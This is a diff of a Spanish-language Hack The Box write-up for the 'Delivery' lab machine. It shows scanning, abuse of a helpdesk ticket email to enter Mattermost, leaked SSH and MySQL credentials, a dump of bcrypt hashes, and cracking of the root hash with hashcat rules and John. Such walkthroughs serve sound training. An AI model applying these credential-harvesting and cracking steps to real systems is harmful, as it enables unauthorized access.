@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Delivery - Hack The Box
-excerpt: "Esta fue una máquina bastante interesante, lo que hicimos fue, analizar el puerto HTTP para descubrir que usan Virtual Hosting, registramos los dominios y aprovechamos un bug que nos crea un correo temporal en OS Ticket, con esto, usaremos el servicio Mattermost para crear una cuenta y obtener un correo de autenticación en el correo del OS Ticket. Una vez dentro de Mattermost, vemos mensajes del Root, que nos indican el usuario y contraseña del servicio SSH y nos dan una pista, siendo que debemos ir a la base de datos de Mattermost dentro del SSH y obtener el hash del Root para poder usar un ataque de reglas de hashcat para poder crackearlo y con esto, autenticarnos como Root."
+excerpt: "Esta fue una máquina bastante interesante, lo que hicimos fue analizar el servicio HTTP para descubrir que tienen un sistema de tickets y un servidor, a su vez usan Virtual Hosting por lo que registramos los dominios y aprovechamos un ticket creado que nos crea un correo temporal en OS Ticket (su sistema de tickets), con esto usaremos el servicio Mattermost para crear una cuenta con el fin de entrar a este servicio. Una vez dentro de Mattermost, vemos mensajes del Root, que nos indican el usuario y contraseña del servicio SSH, además nos dan una pista siendo que debemos ir a la base de datos de Mattermost dentro del servicio SSH para obtener el hash del Root, con esto podremos usar las reglas de hashcat para poder crear un diccionario y poder crackear el hash para autenticarnos como Root."
 date: 2023-05-05
 classes: wide
 header:
@@ -20,11 +20,23 @@ tags:
   - Information Leakage
   - MySQL Enumeration
   - Cracking Hash
-  - Hashcat
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-delivery/delivery_logo.png)
-Esta fue una máquina bastante interesante, lo que hicimos fue, analizar el puerto HTTP para descubrir que usan Virtual Hosting, registramos los dominios y aprovechamos un bug que nos crea un correo temporal en OS Ticket, con esto, usaremos el servicio Mattermost para crear una cuenta y obtener un correo de autenticación en el correo del OS Ticket. Una vez dentro de Mattermost, vemos mensajes del Root, que nos indican el usuario y contraseña del servicio SSH y nos dan una pista, siendo que debemos ir a la base de datos de Mattermost dentro del SSH y obtener el hash del Root para poder usar un ataque de reglas de hashcat para poder crackearlo y con esto, autenticarnos como Root.
+
+Esta fue una máquina bastante interesante, lo que hicimos fue analizar el **servicio HTTP** para descubrir que tienen un sistema de tickets y un servidor, a su vez usan **Virtual Hosting** por lo que registramos los dominios y aprovechamos un ticket creado que nos crea un correo temporal en **OS Ticket (su sistema de tickets)**, con esto usaremos el **servicio Mattermost** para crear una cuenta con el fin de entrar a este servicio. Una vez dentro de **Mattermost**, vemos mensajes del usuario Root, que nos indican el usuario y contraseña del **servicio SSH**, además nos dan una pista siendo que debemos ir a la **base de datos de Mattermost** dentro del **servicio SSH** para obtener el hash del Root, con esto podremos usar las **reglas de hashcat** para poder crear un diccionario y poder crackear el hash para autenticarnos como Root.
+
+Herramientas utilizadas:
+* *nmap*
+* *wappalizer*
+* *whatweb*
+* *nano*
+* *ssh*
+* *grep*
+* *mysql*
+* *hashid*
+* *hashcat*
+* *johntheripper*
 
 
 <br>
@@ -40,18 +52,20 @@ Esta fue una máquina bastante interesante, lo que hicimos fue, analizar el puer
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#HTTP">Analizando Puerto 80</a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+				<li><a href="#Ticket">Probando Servicio OS Ticket y Ganando Acceso a Servicio Mattermost</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#Matter">Analizando Servicio Mattermost</a></li>				
+				<li><a href="#Matter">Analizando Servicio Mattermost</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
 				<li><a href="#Matter2">Buscando Hashes del Servicio Mattermost</a></li>
-                                <li><a href="#Mysql">Enumeración Base de Datos MySQL</a></li>
-				<li><a href="#Hash">Crackeando Hash</a></li>
-				<li><a href="#Root">Escalando a Root</a></li>
+				<ul>
+	                                <li><a href="#Mysql">Enumeración de Base de Datos MySQL</a></li>
+				</ul>
+				<li><a href="#Hash">Creando Diccionario con Reglas de Hashcat y Crackeando Hash de Contraseña del Usuario Root</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -71,8 +85,9 @@ Esta fue una máquina bastante interesante, lo que hicimos fue, analizar el puer
 
 
 <h2 id="Ping">Traza ICMP</h2>
+
 Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
-```
+```bash
 ping -c 4 10.10.10.222
 PING 10.10.10.222 (10.10.10.222) 56(84) bytes of data.
 64 bytes from 10.10.10.222: icmp_seq=1 ttl=63 time=131 ms
@@ -87,7 +102,8 @@ rtt min/avg/max/mdev = 130.588/131.581/132.319/0.666 ms
 Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
-```
+
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.222 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 12:22 CST
@@ -111,19 +127,23 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 35.97 seconds
            Raw packets sent: 172589 (7.594MB) | Rcvd: 26071 (1.077MB)
 ```
-* -p-: Para indicarle un escaneo en ciertos puertos.
-* --open: Para indicar que aplique el escaneo en los puertos abiertos.
-* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
-* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
-* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
-* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
-* -Pn: Para indicar que se omita el descubrimiento de hosts.
-* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
 
 Hay 3 puertos abiertos, pero se me hace que todo se va a basar en el puerto HTTP, hagamos un escaneo de servicios.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
-```
+
+```bash
 nmap -sC -sV -p22,80,8065 10.10.10.222 -oN targeted                      
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 12:25 CST
 Nmap scan report for 10.10.10.222
@@ -198,10 +218,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 100.00 seconds
 ```
-* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
-* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
-* -p: Para indicar puertos específicos.
-* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
 
 Ese puerto 8065 se me hace curioso, puede que estemos contra un Virtual Hosting, pero analicemos primero el puerto HTTP.
 
@@ -217,26 +240,38 @@ Ese puerto 8065 se me hace curioso, puede que estemos contra un Virtual Hosting,
 <br>
 
 
-<h2 id="HTTP">Analizando Puerto 80</h2>
+<h2 id="HTTP">Analizando Servicio HTTP</h2>
+
 Entremos.
 
 <p align="center">
 <img src="/assets/images/htb-writeup-delivery/Captura1.png">
 </p>
 
-Ok, veamos que nos dice **Wappalizer**:
+Se ve chula, veamos que nos dice **Wappalizer**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-delivery/Captura2.png">
 </p>
 
-Mmmmm **nginx** otra vez, tengámoslo en cuenta para más adelante. Mientras sigamos analizando la página.
+Ahora probemos con **whatweb** por si nos da algo más:
+```bash
+whatweb http://10.10.10.222
+http://10.10.10.222 [200 OK] Country[RESERVED][ZZ], Email[jane@untitled.tld], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.222], JQuery, Script, Title[Welcome], nginx[1.14.2]
+```
+Mmmmm **nginx** otra vez, tengámoslo en cuenta para más adelante.
+
+Si analizamos la página, tiene 2 botónes que nos redirigen a otras páginas, el primero que llama la atención es el de **CONTACT US**, entremos primero a ese:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-delivery/Captura3.png">
 </p>
 
-Si entramos en la sección **Contact**, vemos que podemos irnos a dos subpáginas, veamos que son:
+Una vez ahí, nos menciona que para usuarios no registrados podemos entrar al **HelpDesk**, ese registro nos dara un correo tipo **@delivery.htb** con el que podremos entrar al servidor **Mattermost**.
+
+La página de **HelpDesk**, es la misma que se menciona en la página principal.
+
+Entremos a ambas para ver que podemos encontrar:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-delivery/Captura4.png">
@@ -246,10 +281,11 @@ Si entramos en la sección **Contact**, vemos que podemos irnos a dos subpágina
 <img src="/assets/images/htb-writeup-delivery/Captura5.png">
 </p>
 
-No se ve nada, entonces vamos a registrar el dominio en el **/etc/hosts** y el subdominio del **helpdesk**:
-```
+No vemos nada, esto indica que estan aplicando **Virtual Hosting**. Vamos a registrar el dominio y subdominio (el dominio del **HelpDesk**) en el **/etc/hosts**:
+
+```bash
 nano /etc/hosts
-10.10.10.222 delivery.htb, helpdesk.delivery.htb
+10.10.10.222 delivery.htb helpdesk.delivery.htb
 ```
 Y recarguemos otra vez las páginas, ya deberían verse:
 
@@ -261,13 +297,27 @@ Y recarguemos otra vez las páginas, ya deberían verse:
 <img src="/assets/images/htb-writeup-delivery/Captura7.png">
 </p>
 
-Vemos dos servicios, investiguemos un poquito que son:
+Excelente, tenemos lo que parece ser un sistema de tickets y un login en la otra página, en ambas se menciona un servicio distinto, en el sistema de tickets aparece el servicio **OS Ticket** y en el login aparece **Mattermost**.
 
-* **OS Ticket**: es un sistema de tickets de asistencia de código abierto. Dirige las consultas creadas a través de correo electrónico, formularios web y llamadas telefónicas hacia una plataforma de asistencia al cliente sencilla, fácil de usar y multiusuario basada en la web.
+Investiguemos un poquito que son:
 
-* **Mattermost**: Mattermost es un servicio de chat en línea de código abierto y autohospedable con intercambio de archivos, búsqueda e integraciones. Está diseñado como un chat interno para organizaciones y empresas, y en su mayoría se comercializa como una alternativa de código abierto a Slack y Microsoft Teams.
+| **Servicio OS Ticket** |
+|:-----------:|
+| *Es un sistema de tickets de asistencia de código abierto. Dirige las consultas creadas a través de correo electrónico, formularios web y llamadas telefónicas hacia una plataforma de asistencia al cliente sencilla, fácil de usar y multiusuario basada en la web.* |
 
-Ahora lo que haremos, será probar lo que nos indica la página, el problema es que si queremos crear una cuenta, nos piden verificar la cuenta aprobando un correo que ellos nos manden, esto no nos funcionara, por lo que tenemos que investigar más que podemos hacer.
+<br>
+
+| **Servicio Mattermost** |
+|:-----------:|
+| *Mattermost es un servicio de chat en línea de código abierto y autohospedable con intercambio de archivos, búsqueda e integraciones. Está diseñado como un chat interno para organizaciones y empresas, y en su mayoría se comercializa como una alternativa de código abierto a Slack y Microsoft Teams.* |
+
+<br>
+
+Bien, como de momento no tenemos credenciales que podamos usar contra el login de **Mattermost**, vamos directamente a probar el sistema de tickets para poder registrarnos y crear un usuario.
+
+<h2 id="Ticket">Probando Servicio OS Ticket y Ganando Acceso a Servicio Mattermost</h2>
+
+Revisando las funciones de la página, encontramos la opción para crear una cuenta, el problema es que nos piden verificar la cuenta aprobando un correo que ellos nos manden, esto no nos fucionara por lo que descartamos esta función.
 
 Tratemos de abrir un nuevo ticket, para ver que pasa:
 
@@ -275,19 +325,25 @@ Tratemos de abrir un nuevo ticket, para ver que pasa:
 <img src="/assets/images/htb-writeup-delivery/Captura8.png">
 </p>
 
-Y nos da este resultado, **OJO**, el número de ticket es diferente porque don pendejo, ósea yo, no guarde las capturas cuando lo hice bien, lo menciono para que no se confundan:
+Nos pidió algunos datos como correo, nombre, asunto, etc. Unicamente recuerda los más importantes, que son los datos obligatorios que pide la página, esto para 
+
+Y nos da este resultado. 
+
+Si analizamos el ticket, nos da información que podemos guardar y probar:
+* Nos dio un ID.
+* Nos dio un email.
 
 <p align="center">
 <img src="/assets/images/htb-writeup-delivery/Captura9.png">
 </p>
 
-Intentemos ver nuestro ticket como lo indica la imagen:
+Ahora, veamos que información se muestra al revisar nuestro ticket, ve a la sección **Check Ticket Status**, probemos si con el email que nos dio podemos entrar:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-delivery/Captura10.png">
 </p>
 
-Mmmmm nos da error, hagámoslo con nuestro usuario a ver si se puede:
+Y nos da error, hagámoslo con el correo de prueba que metimos al crear el ticket:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-delivery/Captura11.png">
@@ -297,27 +353,33 @@ Mmmmm nos da error, hagámoslo con nuestro usuario a ver si se puede:
 <img src="/assets/images/htb-writeup-delivery/Captura12.png">
 </p>
 
-Se pudo, lo que veo, es que nos creó un correo temporal, por lo que podemos usar este correo temporal para obtener mensajes, al menos podríamos intentar ver si esto se puede.
+Excelente, podemos ver la información de nuestro ticket.
 
-¿Ahora qué? Por lo que entiendo y lo que nos dice la página, si tenemos un usuario, podemos loguearnos en el servicio **Mattermost**, entonces vamos a crear un usuario con el mismo correo temporal que nos generó el **OS Ticket** para ver si nos llega el correo de autenticación, veamos que sucede:
+Recordando lo que nos dijo la página principal, ya tenemos un correo valido para registrarnos en el servidor **Mattermost**, probemos a registrar el email que nos dio el sistema de tickets.
 
 <p align="center">
 <img src="/assets/images/htb-writeup-delivery/Captura13.png">
 </p>
 
-Ok, ya se creó, pero igual nos pide que verifiquemos a través de un email. ¿Se abra enviado algo a la cuenta del ticket? Comprobemos:
+Muy bien, ya se creó, pero igual nos pide que verifiquemos a través de un email que **Mattermost** envío. 
+
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura20.png">
+</p>
+
+¿Se abra enviado algo a la cuenta del ticket? Comprobemos:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-delivery/Captura14.png">
 </p>
 
-Ufff, usemos el link que nos mandaron, quizá con eso ya autenticaremos la cuenta del servicio **Mattermost**:
+Excelente, usemos el link que nos mandaron para autenticar la nueva cuenta del servicio **Mattermost**, solo copia y pega el link en una nueva pestaña:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-delivery/Captura15.png">
 </p>
 
-¡Listo! Metemos la contraseña de prueba que hayas puesto y logueate:
+Bien, escribe la contraseña de prueba que hayas puesto y logueate:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-delivery/Captura16.png">
@@ -346,20 +408,25 @@ Bien, veamos que hay dentro una vez logueados:
 <img src="/assets/images/htb-writeup-delivery/Captura17.png">
 </p>
 
-Vamos a darle skip:
+Vamos a darle skip y veamos que nos muestra:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-delivery/Captura18.png">
 </p>
 
-Mmmmm nos salen mensajes del root, si traducimos lo que nos menciona en el primer mensaje, nos dan un usuario y contraseña, que supongo son del servicio SSH. Pero antes, veamos la versión de **Mattermost** por si lo necesitamos después:
+Al parecer, nos muestra la conversación de un usuario root hacia el equipo de desarrollo. En resumen, menciona que necesitan cambiar una plantilla del sistema de tickets y con esto da un usuario y contraseña para entrar al servidor, aunque no menciona a que servidor, supongo que se refiere al **servicio SSH**.
+
+Además, menciona que deben crear un programa que los ayude a crear distintas contraseñas, pues no quieren que la contraseña que siempre usan en casi todo, quede registrada en el Rockyou y/o un hacker se pueda aprovechar de esta.
+
+Antes de probar la contraseña del servidor, veamos si podemos obtener la versión del servicio **Mattermost** por si lo necesitamos después para buscar un exploit:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-delivery/Captura19.png">
 </p>
 
-Ahora sí, entremos al servicio SSH:
-```
+Ahora sí, probemos entrar al **servicio SSH**:
+
+```bash
 ssh maildeliverer@10.10.10.222
 maildeliverer@10.10.10.222's password:
 maildeliverer@10.10.10.222's password: 
@@ -375,6 +442,7 @@ Last login: Fri May  5 15:25:14 2023 from 10.10.14.16
 maildeliverer@Delivery:~$ whoami
 maildeliverer
 ```
+
 ¡Excelente! Busquemos la flag del usuario:
 ```
 maildeliverer@Delivery:~$ ls
@@ -383,6 +451,7 @@ maildeliverer@Delivery:~$ cat user.txt
 ...
 ```
 Listo, ahora busquemos la forma de escalar privilegios.
+
 
 <br>
 <br>
@@ -395,17 +464,22 @@ Listo, ahora busquemos la forma de escalar privilegios.
 </div>
 <br>
 
-Si vemos el segundo mensaje del Root, en el servicio **Mattermost**, veremos que mencionan que la contraseña **PleaseSubscribe!** no deberia estar en el **rockyou.txt**, lo curioso es que mencionan que si un hacker, puede obtener los hashes, de lo que supongo son del servicio **Mattermost**, pueden usar las **rules** de **hashcat** para crackear variaciones de esa contraseña.
-
-Esto obviamente es una pista sobre lo que tenemos que hacer, que es buscar los hashes del servicio **Mattermost** y usar **hashcat** para crear un diccionario de variaciones de la contraseña **PleaseSubscribe!**.
 
 <h2 id="Matter2">Buscando Hashes del Servicio Mattermost</h2>
 
-Checa este blog sobre este servicio:
+Recordando lo que menciono el root en el servidor de **Mattermost**, se menciona un programa para ya no reusar la misma constraseña en todo su sistema, pues si un hacker obtiene los hashes que tienen almacenados, este puede usar las reglas de hashcat para poder crackear y obtener distintas variaciones de la misma contraseña.
+
+Esto obviamente es una pista de lo que debemos hacer, lo principal sería buscar los hashes del servicio **Mattermost** y luego utilizar la contraseña que menciona el root (**PleaseSubscribe!**) para crear variaciones con las reglas de **hashcat**, esto con el fin de crackear esos hashes.
+
+Busquemos información sobre donde estan estos hashes.
+
+Checa este blog sobre **Mattermost**:
 * https://www.drivemeca.com/mattermost-linux-server/
 
-Hay un archivo llamado **config.json**, que se encuentra en **/opt/mattermost/**. Este puede contener información valiosa de la base de datos, vayamos a verla:
-```
+Hay un archivo llamado **config.json**, que se encuentra en el directorio **/opt/mattermost/**. 
+
+Este puede contener información valiosa de la base de datos (como los hashes que buscamos), vayamos a verla:
+```bash
 maildeliverer@Delivery:~$ cd /opt/mattermost
 maildeliverer@Delivery:/opt/mattermost$ ls
 bin     config  ENTERPRISE-EDITION-LICENSE.txt  i18n  manifest.txt  plugins              README.md
@@ -414,8 +488,9 @@ maildeliverer@Delivery:/opt/mattermost$ cd config/
 maildeliverer@Delivery:/opt/mattermost/config$ ls
 cloud_defaults.json  config.json  README.md
 ```
+
 Veamos el interior:
-```
+```bash
 maildeliverer@Delivery:/opt/mattermost/config$ cat config.json 
 {
     "ServiceSettings": {
@@ -430,13 +505,15 @@ maildeliverer@Delivery:/opt/mattermost/config$ cat config.json
         "TLSStrictTransport": false,
 ...
 ```
-Si usamos **grep**, buscando sql o mysql, nos dará un resultado más acertado de donde buscar:
-```
+
+Contiene bastante información, si usamos **grep** buscando las palabras **sql** o **mysql**, nos dará un resultado más acertado de donde buscar:
+```bash
 maildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep sql
         "DriverName": "mysql",
 ```
-Y buscando eso, encontramos algo crítico:
-```
+
+Y buscando eso, encontramos algo importante y crítico:
+```json
 "SqlSettings": {
         "DriverName": "mysql",
         "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
@@ -451,11 +528,14 @@ Y buscando eso, encontramos algo crítico:
         "DisableDatabaseSearch": false
     },
 ```
-Tenemos un usuario y contraseña, para conectarnos a la base de datos de **mysql**, checa este blog:
+
+Tenemos un usuario y contraseña para conectarnos a la base de datos de **MySQL**.
+
+Si no sabes como se hace esto, checa este blog:
 * https://help.dreamhost.com/hc/es/articles/214882998-Conectarse-a-una-base-de-datos-v%C3%ADa-SSH
 
 Bien, conectémonos:
-```
+```bash
 maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p
 Enter password: 
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
@@ -470,10 +550,12 @@ MariaDB [(none)]>
 ```
 Ahora investiguemos la base de datos.
 
-<h2 id="Mysql">Enumeración Base de Datos MySQL</h2>
+<br>
+
+<h3 id="Mysql">Enumeración de Base de Datos MySQL</h3>
 
 Veamos primero que bases de datos hay:
-```
+```bahs
 MariaDB [(none)]> show databases;
 +--------------------+
 | Database           |
@@ -483,8 +565,9 @@ MariaDB [(none)]> show databases;
 +--------------------+
 2 rows in set (0.001 sec)
 ```
-Usemos la BD **mattermost** y veamos su contenido:
-```
+
+Usemos la BD **Mattermost** y veamos su contenido:
+```bash
 MariaDB [(none)]> use mattermost
 Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
@@ -498,41 +581,7 @@ MariaDB [mattermost]> show tables;
 | Bots                   |
 | ChannelMemberHistory   |
 | ChannelMembers         |
-| Channels               |
-| ClusterDiscovery       |
-| CommandWebhooks        |
-| Commands               |
-| Compliances            |
-| Emoji                  |
-| FileInfo               |
-| GroupChannels          |
-| GroupMembers           |
-| GroupTeams             |
-| IncomingWebhooks       |
-| Jobs                   |
-| Licenses               |
-| LinkMetadata           |
-| OAuthAccessData        |
-| OAuthApps              |
-| OAuthAuthData          |
-| OutgoingWebhooks       |
-| PluginKeyValueStore    |
-| Posts                  |
-| Preferences            |
-| ProductNoticeViewState |
-| PublicChannels         |
-| Reactions              |
-| Roles                  |
-| Schemes                |
-| Sessions               |
-| SidebarCategories      |
-| SidebarChannels        |
-| Status                 |
-| Systems                |
-| TeamMembers            |
-| Teams                  |
-| TermsOfService         |
-| ThreadMemberships      |
+| ...			 |
 | Threads                |
 | Tokens                 |
 | UploadSessions         |
@@ -543,8 +592,9 @@ MariaDB [mattermost]> show tables;
 +------------------------+
 46 rows in set (0.000 sec)
 ```
+
 Tenemos varias tablas, pero me llama la atención la de **Users**, veamos su contenido:
-```
+```bash
 MariaDB [mattermost]> describe Users;
 +--------------------+--------------+------+-----+---------+-------+
 | Field              | Type         | Null | Key | Default | Extra |
@@ -577,8 +627,9 @@ MariaDB [mattermost]> describe Users;
 +--------------------+--------------+------+-----+---------+-------+
 25 rows in set (0.001 sec)
 ```
-Ahuevo, ahí están las credenciales, veamos si se pueden ver:
-```
+
+Excelente, ahí están las columnas del usuario y su contraseña por lo que podemos obtener las credenciales, veamos si se pueden ver:
+```bash
 MariaDB [mattermost]> select Username, Password from Users;
 +----------------------------------+--------------------------------------------------------------+
 | Username                         | Password                                                     |
@@ -591,16 +642,16 @@ MariaDB [mattermost]> select Username, Password from Users;
 | channelexport                    |                                                              |
 | berserkw                         | $2a$10$z35SPIrJtjWwpEeBwfOE..IlOzRiHMkyIdWk2tvdeDBhikWQP06Iy |
 | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
-| berserkwi                        | $2a$10$7RtDTF2AaEtm.ySNa7lJfO5Er93SZl0NXHreFaxZ/7Mqeva2mFm3O |
 +----------------------------------+--------------------------------------------------------------+
 9 rows in set (0.000 sec)
 ```
-Excelente, tenemos la contraseña del Root, pero está encriptada por un tipo de hash que no conocemos, vamos a guardar el hash del Root y analicemoslo con unas herramientas para estos casos.
 
-<h2 id="Hash">Crackeando Hash</h2>
+Muy bien, podemos ver la contraseña del Root, pero está encriptada por un tipo de hash que no conocemos, vamos a guardar el hash del Root y vamos a crackearlo.
+
+<h2 id="Hash">Creando Diccionario con Reglas de Hashcat y Crackeando Hash de Contraseña del Usuario Root</h2>
 
 Para crackear el hash, tenemos que saber el tipo de encriptado que se usó, para saberlo, usaremos la herramienta **hashid**:
-```
+```bash
 hashid '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'
 Analyzing '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'
 [+] Blowfish(OpenBSD) 
@@ -609,30 +660,40 @@ Analyzing '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'
 ```
 El tipo de encriptado, es el que está al final. Por lo tanto, se encriptó usando **bcrypt**.
 
-Ahora lo que haremos, será crear un diccionario, con variaciones de la contraseña que pide el Root, no se use más, hagámoslo por pasos
+| **Encriptación Bcrypt** |
+|:-----------:|
+| *Bcrypt es una función de hash de contraseñas y derivación de claves para contraseñas basada en el cifrado Blowfish. Se supone que la función de derivación de claves es lenta, lo que dificulta la fuerza bruta de la contraseña. Tanto el sistema operativo OpenBSD como el software OpenSSH emplean este algoritmo hash.* |
+
+<br>
+
+Esto hace que sea complicado el crackear este hash, pero gracias a la pista que nos dieron y la contraseña que "ya no usan", es posible que se pueda crackear.
+
+Ahora lo que haremos, será crear un diccionario con variaciones de la contraseña que menciona el Root con la herramienta **hashcat**.
 
 Guardemos esa contraseña en un archivo:
+```bash
+echo "PleaseSubscribe!" > passwd
 ```
-nano passwd
-PleaseSubscribe!
-```
-Para usar hashcat, te recomiendo que leas el siguiente blog:
+Para usar **hashcat**, te recomiendo que leas el siguiente blog:
 * https://jesux.es/cracking/passwords-cracking/
 
 Ahí, hay un apartado llamado **Metodologia** donde se ven como usar las reglas de **hashcat**. Lo interesante es esto:
 
-**El uso de reglas es uno de los puntos fuertes de hashcat, ya que nos permite generar mutaciones en nuestro diccionarios. Hashcat incluye diversos archivos de reglas. Podemos destacar el archivo best64 que obtiene un buen resultado con un pequeño número de reglas.**
+| **Metodologia: Uso de Reglas de Hashcat** |
+|:-----------:|
+| *El uso de reglas es uno de los puntos fuertes de hashcat, ya que nos permite generar mutaciones en nuestro diccionarios. Hashcat incluye diversos archivos de reglas. Podemos destacar el archivo best64 que obtiene un buen resultado con un pequeño número de reglas.* |
 
-Ahora usando **hashcat**, usaremos la regla **best64.rule** para crear variaciones de la contraseña, también usemos el parámetro **--stdout** para utilizar el archivo **passwd** y el resultado se guardará en **diccionario.txt**:
-```
+<br>
+
+Ahora usando **hashcat**, usaremos la regla **best64.rule** para crear variaciones de la contraseña, también usemos el parámetro **--stdout** para utilizar el archivo **passwd** que contiene la contraseña para vaya creando dichas variaciones y el resultado se guardará en **diccionario.txt**:
+```bash
 hashcat -r /usr/share/hashcat/rules/best64.rule --stdout passwd > diccionario.txt
 ls
 credentials.txt  diccionario.txt  flags.txt  hash  passwd
 ```
-**--stdout  |    | Do not crack a hash, instead print candidates only**
 
 Veamos el diccionario que se creó:
-```
+```bash
 cat diccionario.txt 
 PleaseSubscribe!
 !ebircsbuSesaelP
@@ -640,70 +701,7 @@ PLEASESUBSCRIBE!
 pleaseSubscribe!
 PleaseSubscribe!0
 PleaseSubscribe!1
-PleaseSubscribe!2
-PleaseSubscribe!3
-PleaseSubscribe!4
-PleaseSubscribe!5
-PleaseSubscribe!6
-PleaseSubscribe!7
-PleaseSubscribe!8
-PleaseSubscribe!9
-PleaseSubscribe!00
-PleaseSubscribe!01
-PleaseSubscribe!02
-PleaseSubscribe!11
-PleaseSubscribe!12
-PleaseSubscribe!13
-PleaseSubscribe!21
-PleaseSubscribe!22
-PleaseSubscribe!23
-PleaseSubscribe!69
-PleaseSubscribe!77
-PleaseSubscribe!88
-PleaseSubscribe!99
-PleaseSubscribe!123
-PleaseSubscribe!e
-PleaseSubscribe!s
-PleaseSubscribea
-PleaseSubscribs
-PleaseSubscriba
-PleaseSubscriber
-PleaseSubscribie
-PleaseSubscrio
-PleaseSubscriy
-PleaseSubscri123
-PleaseSubscriman
-PleaseSubscridog
-1PleaseSubscribe!
-thePleaseSubscribe!
-dleaseSubscribe!
-maeaseSubscribe!
-PleaseSubscribe!
-PleaseSubscr1be!
-Pl3as3Subscrib3!
-PlaseSubscribe!
-PlseSubscribe!
-PleseSubscribe!
-PleaeSubscribe!
-Ples
-Pleas1
-PleaseSubscribe
-PleaseSubscrib
-PleaseSubscri
-PleaseSubscriPleaseSubscri
-PeaseSubscri
-ribe
-bscribe!easeSu
-PleaseSubscri!
-dleaseSubscrib
-be!PleaseSubscri
-ibe!
-ribe!
-cribcrib
-tlea
-asPasP
-XleaseSubscribe!
-SaseSubscribe!
+...
 PleaSu
 PlesPles
 asP
@@ -712,9 +710,10 @@ PcSu
 PleasS
 PeSubs
 ```
+Son bastantes variaciones, muy bien.
 
-Por último, usemos la herramienta **John** para crackear al fin, el hash del Root:
-```
+Por último, usemos la herramienta **John** para crackear al fin el hash del Root:
+```bash
 john -w=diccionario.txt hash                                                     
 Using default input encoding: UTF-8
 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
@@ -725,12 +724,9 @@ PleaseSubscribe!21 (?)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
-Listo, ahora accedamos como Root.
 
-<h2 id="Root">Escalando a Root</h2>
-
-Usemos la contraseña crackeada para ser Root:
-```
+Listo, ahora autentiquemonos como el usuario Root en el **servicio SSH**:
+```bash
 ssh maildeliverer@10.10.10.222
 maildeliverer@10.10.10.222's password: 
